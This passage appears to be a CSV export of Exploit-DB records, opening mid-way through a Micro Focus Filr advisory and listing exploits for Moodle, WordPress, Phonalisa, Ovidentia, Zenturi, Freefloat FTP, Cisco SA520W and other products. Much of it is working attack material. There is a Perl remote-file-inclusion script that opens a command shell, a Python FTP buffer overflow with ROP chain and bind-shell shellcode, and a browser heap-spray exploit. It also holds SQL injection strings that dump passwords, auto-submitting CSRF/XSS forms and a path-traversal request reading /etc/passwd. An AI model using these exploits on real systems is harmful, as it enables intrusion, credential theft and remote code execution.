as root to perform privileged actions. They have fixed the command injection in this release and the next release will include much more stringent parameter validation for passing the commands.  Issue #5: According to Micro Focus, a component of Filr does not function properly when the httpOnly flag is enabled. This will be addressed in a future release.   Workaround: ----------- None   Advisory URL: ------------- https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  SEC Consult Vulnerability Lab  SEC Consult Bangkok - Berlin - Linz - Montreal - Moscow Singapore - Vienna (HQ) - Vilnius - Zurich  About SEC Consult Vulnerability Lab The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It ensures the continued knowledge gain of SEC Consult in the field of network and application security to stay ahead of the attacker. The SEC Consult Vulnerability Lab supports high-quality penetration testing and the evaluation of new offensive and defensive technologies for our customers. Hence our customers obtain the most current information about vulnerabilities and valid recommendation about the risk profile of new technologies.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Interested to work with the experts of SEC Consult? Send us your application https://www.sec-consult.com/en/Career.htm  Interested in improving your cyber security with the experts of SEC Consult?  Contact our local offices https://www.sec-consult.com/en/About/Contact.htm ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Mail: research at sec-consult dot com Web: https://www.sec-consult.com Blog: http://blog.sec-consult.com Twitter: https://twitter.com/sec_consult  EOF W. Ettlinger / @2016",Micro Focus Filr,1
28895,"Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service source: https://www.securityfocus.com/bid/20870/info  The Linux kernel is prone to a local denial-of-service vulnerability.   An attacker can exploit this issue to crash the affected computer, denying service to legitimate users.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/28895.img.gz",Linux Kernel,1
34169,"Moodle 2.7 - Persistent Cross-Site Scripting Title: Moodle 2.7 Persistent XSS Vendor: https://moodle.org/ Moodle advisory: https://moodle.org/mod/forum/discuss.php?d=264265 Researched by: Osanda Malith Jayathissa (@OsandaMalith) E-Mail: osanda[cat]unseen.is Original write-up: http://osandamalith.wordpress.com/2014/07/25/moodle-2-7-persistent-xss/  [-] POC ================  1. Edit your profile 2. Click Optional 3. In Skype ID field inject this payload  x"" onload=""prompt('XSS by Osanda')"">""  [-] Disclosure Timeline ========================  2014-05-24: Responsibly disclosed to the Vendor 2014-05-27: Suggested a fix 2014-06-04: Fix got accepted 2014-07-21: Vendor releases a security announcement  2014-07-24: Released Moodle 2.7.1 stable with all patches",Moodle,1
42317,"WordPress Plugin Sabai Discuss - Cross-Site Scripting # Exploit Title: Sabai Discuss Wordpress Plugin Stored XSS vulnerability # Exploit Author: Hesam Bazvand # Contact: https://www.facebook.com/hesam.king73 # Software demo : https://sabaidiscuss.com/ # Tested on: Windows 7 / Kali Linux # Category: WebApps # Dork : User Your Mind ! :D # Video Demo : https://youtu.be/QETN6cvBMoM # Email : Black.king066@gmail.com # Special thanks to Mr alireza ajami   1- Create new question  	http://localhost/wordpress/questions/ask  2- Insert XSS Code in Title Field  3- Enjoy it!",WordPress Plugin Sabai Discuss,1
37499,"Phonalisa - Multiple HTML Injection / Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/54401/info  Phonalisa is prone to multiple HTML-injection, cross-site-scripting, and arbitrary code-execution vulnerabilities because the application fails to sufficiently sanitize user-supplied data.  Attackers can exploit these issues to execute arbitrary code in the context of the web server, compromise the affected application, or steal cookie-based authentication credentials from legitimate users of the site. Other attacks are also possible.  Phonalisa 5.0 is vulnerable; other versions may also be affected.   http://www.example.com/?s=monitorqueues&sudo=su%22%3E%3Ciframe%20src=a%20onload=alert%28document.cookie%29%20%3C [XSS]  http://www.example.com/?s=monitorqueues&sudo=su%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C [XSS]  http://www.example.com/?s=home&m=home&sudo=%22%3E%3Cimg%20src=http://www.vuln-lab.com/images/200911/11/i8du12ievi9fh1a9rm-owned-headonfire.jpg%20onload=alert%28123%29;%20/%3E&setlang=en-us [XSS]  http://www.example.com/?s=home&m=home&sudo=%22%3E%3Cimg%20src=http://www.vuln-lab.com/images/200911/11/i8du12ievi9fh1a9rm-owned-headonfire.jpg%20/%3E&setlang=en-us [XSS]  http://www.example.com/?s=provphones&m=phones&sudo=su&mac=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL %22%29%20%3C&ip=127.0.0.1&pbx_id=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&phone_type=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C [XSS]  http://www.example.com/&mac=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&sudo=suÂ§ion=%2Fprov%2Fcisco [XSS]",Phonalisa,1
31999,"IBM Tivoli Directory Server 6.1.x - Adding 'ibm-globalAdminGroup' Entry Denial of Service source: https://www.securityfocus.com/bid/30010/info  IBM Tivoli Directory Server is prone to a denial-of-service vulnerability because the server contains a double-free error.  An attacker can exploit this issue to crash the affected server with a SIGSEGV fault, denying service to legitimate users.  Tivoli Directory Server 6.1.0.0 - 6.1.0.15 are affected.   The following 'ldapadd' entry is sufficient to trigger the issue:  dn: globalGroupName=GlobalAdminGroup,cn=ibmpolicies globalGroupName: GlobalAdminGroup objectclass: top objectclass: ibm-globalAdminGroup",IBM Tivoli Directory Server,1
39146,"Jigowatt PHP Event Calendar - 'day_view.php' SQL Injection source: https://www.securityfocus.com/bid/66923/info  Jigowatt PHP Event Calendar is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Jigowatt PHP Event Calendar 2.16b is vulnerable; other versions may also be affected.   http://www.example.com/code/calendar/day_view.php?day=23&month=4&year=[SQL injection]",Jigowatt PHP Event Calendar,1
38991,"Ovidentia NewsLetter Module 2.2 - 'admin.php' Remote File Inclusion # Title: Ovidentia Module newsletter 2.2 (admin.php) Remote File Inclusion Exploit # Author: bd0rk # eMail: bd0rk[at]hackermail.com # Twitter: twitter.com/bd0rk # Tested on: Ubuntu-Linux # Download: http://www.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FAdd-ons%2FModules%2Fnewsletter&file=newsletter-2-2.zip&idf=882  # Proof-of-Concept:  # /newsletter-2-2/programs/admin.php line 3 # ----------------------------------------------------------  # require_once($GLOBALS['babInstallPath'].'admin/acl.php');  # ----------------------------------------------------------  # Problem: The $GLOBALS['babInstallPath']-parameter isn't declared before require_once. # Fix: Declare this parameter or use an alert in php-sourcecode. #     Zum Beispiel ""BummPrengeleng du Nasenmensch!"" :D  # ---------------- # ~~Exploitcode~~ # ----------------  use LWP::UserAgent;   $Path = $ARGV[0]; $Pathtocmd = $ARGV[1]; $cmdv = $ARGV[2];   if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}   head();   while() {        print ""[shell] \$""; while(<STDIN>)        {                $cmd=$_;                chomp($cmd);   $xpl = LWP::UserAgent->new() or die; $req = HTTP::Request->new(GET =>$Path.'programs/admin.php?GLOBALS[babInstallPath]'.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die ""\nCould Not connect\n"";   $res = $xpl->request($req); $return = $res->content; $return =~ tr/[\n]/[....]/;   if (!$cmd) {print ""\nPlease Enter a Command\n\n""; $return ="""";}   elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)        {print ""\nCould Not Connect to cmd Host or Invalid Command Variable\n"";exit} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print ""\nInvalid Command or No Return\n\n""}   if($return =~ /(.*)/)     {        $finreturn = $1;        $finreturn=~ tr/[....]/[\n]/;        print ""\r\n$finreturn\n\r"";        last; }   else {print ""[shell] \$"";}}}last;   sub head()  {  print ""\n============================================================================\r\n"";  print "" *Ovidentia Module newsletter 2.2 (admin.php) Remote File Inclusion Exploit*\r\n"";  print ""============================================================================\r\n"";  } sub usage()  {  head();  print "" Usage: sploit.pl [someone] [cmd shell location] [cmd shell variable]\r\n\n"";  print "" <Site> - Full path to phgstats ex: http://www.someone.com/ \r\n"";  print "" <cmd shell> - Path to cmd Shell e.g http://www.someone/cmd.txt \r\n"";  print "" <cmd variable> - Command variable used in php shell \r\n"";  print ""============================================================================\r\n"";  print ""                           Bug Found by bd0rk \r\n"";  print ""============================================================================\r\n"";  exit();  }",Ovidentia NewsLetter Module,1
4214,"Zenturi NixonMyPrograms Class 'sasatl.dll 1.5.0.531' - Remote Buffer Overflow <pre> <code><span style=""font: 10pt Courier New;""><span class=""general1-symbol"">-----------------------------------------------------------------------------  <b>Zenturi NixonMyPrograms Class (sasatl.dll v. 1.5.0.531) ""Scan()"" Method  Remote Buffer Overflow Exploit (Heap Spray Technique)</b>  url: http://www.programchecker.com/activeintro.aspx   author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://shinnai.altervista.org   Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7  <b>This exploits executes calc.exe</b> -----------------------------------------------------------------------------  <object id=boom classid=""clsid:6754F588-E262-42D2-A6BC-3BB400ACFEED"" style=""WIDTH: 578px; HEIGHT: 228px""></object>  <input language=JavaScript onclick=tryMe() type=button value=""Launch Exploit"">  <script>  var shellcode = unescape( ""%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800"" +                            ""%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A"" +                            ""%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350"" +                            ""%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40"" +                            ""%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000"" +                            ""%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040"" +                            ""%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD"" +                            ""%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40"" +                            ""%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18"" +                            ""%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0"" +                            ""%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B"" +                            ""%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24"" +                            ""%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9"" +                            ""%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C"" +                            ""%u652E%u6578%u9000"");   var spraySlide = unescape(""%u9090%u9090"");  var heapSprayToAddress = 0x0c0c0c0c;    function tryMe()    {     var size_buff = 6200;     var x =  unescape(""%0c%0c%0c%0c"");     while (x.length<size_buff) x += x;     x = x.substring(0,size_buff);      boom.Scan(1, x);    }        function getSpraySlide(spraySlide, spraySlideSize)    {     while (spraySlide.length*2<spraySlideSize)      {       spraySlide += spraySlide;      }     spraySlide = spraySlide.substring(0,spraySlideSize/2);     return (spraySlide);    }   var heapBlockSize = 0x400000;  var SizeOfHeapDataMoreover = 0x5;  var payLoadSize = (shellcode.length * 2);   var spraySlideSize = heapBlockSize - (payLoadSize + SizeOfHeapDataMoreover);  var heapBlocks = (heapSprayToAddress+heapBlockSize)/heapBlockSize;   var memory = new Array();  spraySlide = getSpraySlide(spraySlide,spraySlideSize);   for (i=0;i<heapBlocks;i++)   {     memory[i] = spraySlide +  shellcode;   } </script> </span></span> </code></pre>  # milw0rm.com [2007-07-23]",Zenturi NixonMyPrograms Class,1
9995,Apache Tomcat - Form Authentication 'Username' Enumeration Attackers can use readily available tools to exploit this issue.  The following example POST data is available:  POST /j_security_check HTTP/1.1 Host: www.example.com  j_username=tomcat&j_password=%,Apache Tomcat,1
22936,"SmartCMS - 'index.php?idx' SQL Injection =============================================================================================================      [o] SmartCMS <= SQL Injection Vulnerability            Software : SmartMS        Vendor   : http://smartcms.nl/        Author   : NoGe        Contact  : noge[dot]code[at]gmail[dot]com        Blog     : http://evilc0de.blogspot.com/   =============================================================================================================     [o] Exploit          http://localhost/[path]/index.php?idx=[SQLi]       [o] PoC          http://localhost/[path]/index.php?idx=123+AND+1=2+UNION+ALL+SELECT+version()--   =============================================================================================================     [o] Greetz          Vrs-hCk OoN_BoY Paman zxvf s4va Angela Zhang stardustmemory        aJe kaka11 matthews wishnusakti inc0mp13te martfella        pizzyroot Genex H312Y noname tukulesto }^-^{   =============================================================================================================     [o] November 26 2012 - Papua, Indonesia",SmartCMS,1
45577,"Ektron CMS 9.20 SP2 - Improper Access Restrictions Details ================ Software: Ektron Content Management System (CMS) Version: 9.20 SP2 Homepage: https://www.episerver.com Advisory report: https://github.com/alt3kx/CVE-2018-12596 CVE: CVE-2018-12596 CVSS: 7.5 (HIGH: (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) CWE-284  Description ================ Ektron CMS 9.20 SP2 allows remote attackers to enable users.  Vulnerability ================ Ektron CMS 9.20 SP2 allows remote attackers to call aspx pages via the ""activateuser.aspx"" page, even if a page is located under the /WorkArea/ path, which is forbidden (normally available exclusively for local admins).  Proof of concept Exploit ========================  Pre-requisites:  - curl command deployed (Windows or Linux) - Burpsuite Free/Pro deployed or any other WebProxy to catch/send GET request  Step (1): Launch the BurpSuite with default paramenter then request the follwing URL:  Target: https://ektronserver.com/WorkArea/activateuser.aspx  Normally you will see a 403 Forbidden: Access denied.  Step (2): Into BurpSuite Free/Pro add the following extra Header Referer:  ""Referer: ALEX;""  Step (3): The offending GET request is:  GET /WorkArea/activateuser.aspx HTTP/1.1 Host: ektronserver.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0 Referer: ALEX; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close  Step (4): Test your GET request using curl command and burpsuite as following:  # curl -i -s -k -XGET ""https://ektronserver.com/WorkArea/activateuser.aspx"" -H ""Host: ektronserver.com"" -H ""User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0"" -H ""Referer: ALEX;"" -H ""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"" -H ""Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate"" -H ""Connection: close"" --proxy http://127.0.0.1:8080  You should see now the following response 200 OK!:  HTTP/1.0 200 Connection established  HTTP/1.1 200 OK Cache-Control: private Content-Type: text/html; charset=utf-8  Now you got access to enable users, just send the repeat request into the browser using burpsuite  Have fun!  Mitigations ================ Install the latest patches available here:  PATCH ID: EKTR-508: Security enhancement for re-enabling a user https://support.episerver.com/hc/en-us/articles/115002828112-9-2-SP2-Site-Update  Any of the below should fix CVE-2018-12596  9.3(main release) 9.2 SP2 Site CU 22 9.1 SP3 Site CU 45 9.0 SP3 Site CU 31  Disclosure policy ================ We believes in responsible disclosure. Please contact us on Alex Hernandez aka alt3kx  (at) protonmail com to acknowledge this report.  This vulnerability will be published if we do not receive a response to this report with 10 days.  Timeline ================ 2018–06–08: Discovered 2018–06–11: Retest staging environment 2018–06–12: Restes live environment 2018–06–19: Internal communication 2018–06–21: Vendor notification 2018–06–21: Vendor feedback 2018–06–29: Vendor feedback product will be patched 2018–06–29: Patch available 2018–06–29: Agrements with the vendor to publish the CVE/Advisory. 2018–07–30: Internal communication 2018–09–15: Patches tested on LAB environment. 2018–10–08: Public report  Discovered by: Alex Hernandez aka alt3kx: ================ Please visit https://github.com/alt3kx for more information. My current exploit list @exploit-db: https://www.exploit-db.com/author/?a=1074",Ektron CMS,1
36313,"webERP 4.3.8 - Multiple Script URI Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/50713/info  webERP is prone to information-disclosure, SQL-injection, and cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.  An attacker may exploit the information-disclosure issue to gain access to sensitive information that may lead to further attacks.  An attacker may exploit the SQL-injection issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  An attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  webERP 4.0.5 is vulnerable; prior versions may also be affected.   http://www.example.com/doc/manual/manualcontents.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/index.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AccountGroups.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AccountSections.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AddCustomerContacts.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3C/html%3E http://www.example.com/AddCustomerNotes.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3C/html%3E http://www.example.com/Areas.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AddCustomerTypeNotes.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AgedDebtors.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AgedSuppliers.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E",webERP,1
17886,"Freefloat FTP Server - Remote Buffer Overflow (DEP Bypass) #!/usr/bin/python import socket, sys from struct import pack  print ""\n==============================="" print ""Freefloat FTP Server DEP Bypass"" print ""       Written by Blake        "" print ""===============================\n""  if len(sys.argv) != 3: 	print ""[*] Usage: %s <target> <port>\n"" % sys.argv[0] 	sys.exit(0)  target = sys.argv[1] port = int(sys.argv[2])  # 728 bytes for shellcode #Bind Shell shellcode port 4444 shellcode = (""\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4"" ""\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c"" ""\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07"" ""\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07"" ""\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e"" ""\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f"" ""\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38"" ""\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65"" ""\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a"" ""\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74"" ""\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5"" ""\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80"" ""\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4"" ""\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80"" ""\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82"" ""\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a"" ""\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70"" ""\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6"" ""\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4"" ""\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6"" ""\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4"" ""\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53"" ""\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84"" ""\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51"" ""\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a"")  buffer = ""\x41"" * 230 eip = pack('<L',0x77f613ac)		# RETN - shlwapi rop = ""\x42"" * 8			# compensate rop += pack('<L',0x77c2362c)		# POP EBX, RETN - msvcirt rop += ""\xff\xff\xff\xff"" rop += pack('<L',0x77c127e1)		# INC EBX, RETN rop += pack('<L',0x5d093466)		# POP EBP, RETN rop += pack('<L',0x7c8622a4)		# SetProcessDEPPolicy  rop += pack('<L',0x5d095470)		# POP EDI, RETN rop += pack('<L',0x5d095471)		# RETN rop += pack('<L',0x5d0913b4)		# POP ESI, RETN rop += pack('<L',0x5d095471)            # RETN rop += pack('<L',0x77e7d102) 		# PUSHAD # RETN - RPCRT4    nops = ""\x90"" * 10 junk = ""\x42"" * (1000 - len(buffer + eip + rop + nops + shellcode))  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) print ""[+] Connecting to %s on port %d"" % (target,port) try: 	s.connect((target,port)) 	s.recv(1024) 	print ""[+] Sending payload"" 	s.send(""USER "" + buffer + eip + rop + nops + shellcode + junk + ""\r\n"") 	s.close() 	print ""[+] Exploit successfully sent"" except: 	print ""[X] Unable to connect to %s"" % target  raw_input(""[+] Press any key to exit\n"")",Freefloat FTP Server,1
48486,"qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting # Exploit Title: qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting  # Google Dork: N/A # Date: 2020-05-19 # Exploit Author: Kishan Lal Choudhary # Vendor Homepage: https://qdpm.net # Software Link: https://sourceforge.net/projects/qdpm/ # Version: 9.1 # Tested on: Windows 10  Description: The form parameter 'cfg[app_app_name]' is vulnerable to stored cross site scripting Payload: <script>alert(1)</script>   POST /index.php/configuration HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------224716807133186052992861925563 Content-Length: 1881 Origin: http://localhost/ DNT: 1 Connection: close Referer: http://localhost/index.php/configuration?type=general Cookie: qdPM8=c14e5521818ec7a0c8bbc3099a96b94a Upgrade-Insecure-Requests: 1  -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""type""  general -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_administrator_email]""  admin@localhost.com -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_administrator_password]""   -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_app_name]""  <script>alert(1)</script> -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_app_short_name]""  qdPM -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg_app_app_logo_file""; filename="""" Content-Type: application/octet-stream   -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_app_logo]""   -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[sf_default_timezone]""  America/New_York -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[sf_default_culture]""  ar -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_rows_per_page]""  25 -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_rows_limit]""  1000 -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_custom_short_date_format]""  d M Y -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_custom_logn_date_format]""  d M Y H:i -----------------------------224716807133186052992861925563--",qdPM,1
34412,"Hulihan Applications BXR 0.6.8 - SQL Injection / HTML Injection source: https://www.securityfocus.com/bid/42247/info  Hulihan Applications BXR is prone to an SQL-injection vulnerability and multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input.  An attacker may leverage these issues to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database or to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is viewed, and launch other attacks.  Hulihan Applications BXR 0.6.8 is vulnerable; other versions may also be affected.  http://www.example.com/folder/list?order_by=filesize&#039;+SQL   <form action=""http://host/search/show_results"" method=""post"" name=""main"" >  <input type=""hidden"" name=""search_type"" value=""filename"" /> <input type=""hidden"" name=""search[query]"" value=&#039;1""><script>alert(document.cookie)</script>&#039; /> <input type=""hidden"" name=""commit"" value=""Find!"" />  </form> <script> document.main.submit(); </script>   mytagname""><script>alert(document.cookie)</script>   <form action=""http://host/settings/update_settings"" method=""post"" name=""main"" >  <input type=""hidden"" name=""setting[site_title]"" value=&#039;BXR File Management System""><script>alert(document.cookie)</script>&#039; /> <input type=""hidden"" name=""setting[site_keywords]"" value=""BXR, Open Source File Management System"" /> <input type=""hidden"" name=""setting[site_description]"" value=""The Free, Open Source, Ruby on Rails File Management System."" /> <input type=""hidden"" name=""setting[let_users_change_default_folder]"" value=""0"" /> <input type=""hidden"" name=""setting[use_ferret]"" value=""0"" /> <input type=""hidden"" name=""setting[overwrite_existing_files]"" value=""0"" /> <input type=""hidden"" name=""commit"" value=""Update Settings"" />  </form> <script> document.main.submit(); </script>",Hulihan Applications BXR,1
9481,"Moa Gallery 1.1.0 - 'gallery_id' SQL Injection ====================================================================== [Â»] Script : Moa gallery 1.1.0 (gallery_id) Remote Sql injection vuln  [Â»] Language : php    [Â»] Download : http://sourceforge.net/projects/moagallery/  [Â»] Script site : http://www.moagallery.net/  [Â»] Founder: Mr.tro0oqy <- from Yemen  [Â»] Gr44tz to: [H]-> borken heart :(  [Â»] E-mail : t.4@windowslive.com ====================================================================== exploit: --------  http://www.xxx.com/path/index.php?action=gallery_view&gallery_id=-0000000009+union+select+concat(name,char(58),password)+from+moa_users--  -------- demo: --------  http://www.moagallery.net/demo/index.php?action=gallery_view&gallery_id=-0000000609+union+select+concat%28name,char%2858%29,password%29+from+moa_users--  # milw0rm.com [2009-08-24]",Moa Gallery,1
44650,"Cisco SA520W Security Appliance - Path Traversal # Title: Cisco SA520W Security Appliance - Path Traversal # Author: Nassim Asrir # Contact: wassline@gmail.com / https://www.linkedin.com/in/nassim-asrir-b73a57122/ # Vendor: https://www.cisco.com/ # About Product: =============== Cisco SA 500 Series Security Appliances are designed for businesses with fewer than 100 employees.  They combine firewall, VPN, and optional intrusion prevention system (IPS), email, and web security capabilities. Whether in the office or working remotely, your employees can securely access the resources they need, while your business is protected from unauthorized access and Internet threats.  # POC ====================  //In our poc we will try to read /etc/passwd  The vulnerable Parameter: thispage  payload: ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00index.htm  Request Type: POST  Request: =======  POST /scgi-bin/platform.cgi HTTP/1.1 Host: host-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: https://70.186.255.169/scgi-bin/platform.cgi Content-Type: application/x-www-form-urlencoded Content-Length: 311 Connection: close Upgrade-Insecure-Requests: 1  thispage=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00index.htm&SSLVPNUser.UserName=admin&SSLVPNUser.Password=admin&button.login.routerStatus=Log+In&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A58.0%29+Gecko%2F20100101+Firefox%2F58.0  Response: ========  HTTP/1.0 200 OK Date: Sat, 01 Jan 2000 00:00:41 GMT Server: Embedded HTTP Server. Connection: close root:$1$omdZQoH8$bFOOjhl.E7BKKzvW/bRJe0:0:0:root:/:/bin/sh nobody:x:0:0:nobody:/nonexistent:/bin/false  #Timeline: ========= 	 18 Apr 2018 : First Contact with Cisco. 18 Apr 2018 : Cisco Ask me for more details about the vulnerability. 18 Apr 2018 : Details sent to Cisco 19 Apr 2018 : Ask for update 15 May 2018 : Cisco say ""The product you reference went end of support in April 2016 No further action will be taken."" 18 May 2018 : Public Disclosure",Cisco SA520W Security Appliance,1
